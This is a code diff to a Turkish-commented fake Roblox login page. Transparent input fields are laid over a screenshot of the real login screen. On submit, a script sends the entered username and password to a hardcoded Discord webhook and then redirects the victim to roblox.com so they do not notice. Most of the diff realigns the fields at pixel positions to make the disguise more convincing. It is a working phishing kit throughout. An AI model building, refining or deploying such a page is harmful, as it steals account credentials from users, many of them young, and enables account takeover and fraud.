@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Giriş</title>
     <style>
+        /* Tüm ekranı sıfırlama ve arka plan */
         html, body {
             margin: 0;
             padding: 0;
@@ -18,12 +19,16 @@
             font-family: Arial, sans-serif;
         }
 
-        .container {
+        /* 
+           KÖKTEN ÇÖZÜM: Formu ve resmi tek bir sabit kutuya kilitliyoruz.
+           Resim küçülse de büyüse de inputlar da resimle aynı oranda kalır.
+        */
+        .wrapper {
             position: relative;
             width: 100%;
             height: 100%;
-            max-width: 100vw;
-            max-height: 100vh;
+            max-width: 540px;  /* Resmin panel genişliği standardı */
+            max-height: 600px; /* Resmin panel yükseklik standardı */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -36,10 +41,11 @@
             display: block;
         }
 
-        .container input, .container button, .container a {
+        /* Tüm interaktif alanların (giriş ve butonların) ortak CSS ayarları */
+        .wrapper input, .wrapper button, .wrapper a {
             position: absolute;
-            width: 19.5%; 
-            height: 38px; 
+            width: 82%; /* Gri kutuların genişlik oranı */
+            height: 40px; /* Resimdeki kutuların gerçek piksel yüksekliği */
             left: 50%;
             transform: translateX(-50%);
             background: transparent;
@@ -48,72 +54,109 @@
             box-sizing: border-box;
         }
 
-        .container input {
+        /* Yazı yazılan giriş alanlarının iç metin hizalaması */
+        .wrapper input {
             color: #ffffff;
-            font-size: 14px;
-            padding: 0 12px;
-            line-height: 38px; 
-            height: 38px;
+            font-size: 15px;
+            padding: 0 14px;
+            line-height: 40px; /* Yazının kutu içinde dikeyde tam ortalanmasını sağlar */
         }
 
-        .container button, .container a {
+        .wrapper button, .wrapper a {
             cursor: pointer;
         }
 
-        .username-field { top: calc(30% - 17px); }
-        .password-field { top: calc(33% - 25px); }
-        .login-btn { top: calc(46.8% - 10px); }
-        
-        .one-time-code-btn { top: 57.5%; height: 42px; }
-        .quick-login-btn { top: 62.5%; height: 42px; }
-        .signup-link { top: 69.5%; height: 25px; width: 5%; left: 58%; }
+        /* ============================================================ */
+        /* MİLİMETRİK SABİT PİKSEL KONUMLANDIRMALARI (Yukarıdan Aşağıya) */
+        /* ============================================================ */
+
+        /* 1. KUTU: Username/Email/Phone alanı */
+        .username-field {
+            top: 132px; 
+        }
+
+        /* 2. KUTU: Password alanı */
+        .password-field {
+            top: 204px; 
+        }
+
+        /* 3. BUTON: Log in butonu */
+        .login-btn {
+            top: 275px; 
+            height: 44px; /* Log in butonu biraz daha kalın */
+        }
+
+        /* 4. BUTON: Send me the one-time code by email */
+        .one-time-code-btn {
+            top: 395px; 
+            height: 44px;
+        }
+
+        /* 5. BUTON: Quick Login */
+        .quick-login-btn {
+            top: 454px; 
+            height: 44px;
+        }
+
+        /* 6. LİNK: En alttaki Sign Up yazısı */
+        .signup-link {
+            top: 524px;
+            height: 25px;
+            width: 70px; /* Sadece "Sign up." kelimesinin genişliği */
+            left: 335px; /* Kelimenin sağ taraftaki tam yatay pozisyonu */
+            transform: none; /* Sol-sağ kaymasını bozmamak için */
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <!-- Tüm elemanları resimle birlikte kilitleyen yeni ana kapsayıcı -->
+    <div class="wrapper">
+        <!-- Arka plan resmi -->
         <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
 
-        <!-- id="girisFormu" ekledik ve PHP yönlendirmesini iptal ettik -->
+        <!-- Form Elemanları (Milimetrik piksel hesabı ile yerleştirildi) -->
         <form id="girisFormu">
+            <!-- Kullanıcı adı input -->
             <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
+            
+            <!-- Şifre input -->
             <input type="password" id="password" name="password" class="password-field" required>
+            
+            <!-- Log in Giriş butonu -->
             <button type="submit" class="login-btn" title="Giriş Yap"></button>
         </form>
 
+        <!-- Diğer Fonksiyonel Butonlar ve Linkler -->
         <button type="button" class="one-time-code-btn"></button>
         <button type="button" class="quick-login-btn"></button>
         <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
     </div>
 
-    <!-- ARKA PLAN GİZLİ VERİ GÖNDERME KODU -->
+    <!-- DISCORD WEBHOOK BAĞLANTISI -->
     <script>
-        // BURAYA KOPYALADIĞIN DISCORD WEBHOOK LİNKİNİ YAPIŞTIR
+        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIRMAYI UNUTMA KANKA!
         const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";
 
         document.getElementById('girisFormu').addEventListener('submit', function(e) {
-            e.preventDefault(); // Sayfanın yenilenmesini engeller
+            e.preventDefault();
 
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
 
-            // Discord'a gidecek mesaj formatı
             const mesaj = {
-                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı Adı / E-posta:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
+                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
             };
 
-            // Veriyi gizlice Discord'a postalar
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(mesaj)
             })
             .then(() => {
-                // Şifreyi gönderdikten sonra şüphe çekmemek için kurbanı gerçek Roblox sitesine yönlendirir
                 window.location.href = "https://roblox.com";
             })
-            .catch((error) => {
-                // Hata olsa bile çaktırmamak için yine de yönlendirir
+            .catch(() => {
                 window.location.href = "https://roblox.com";
             });
         });
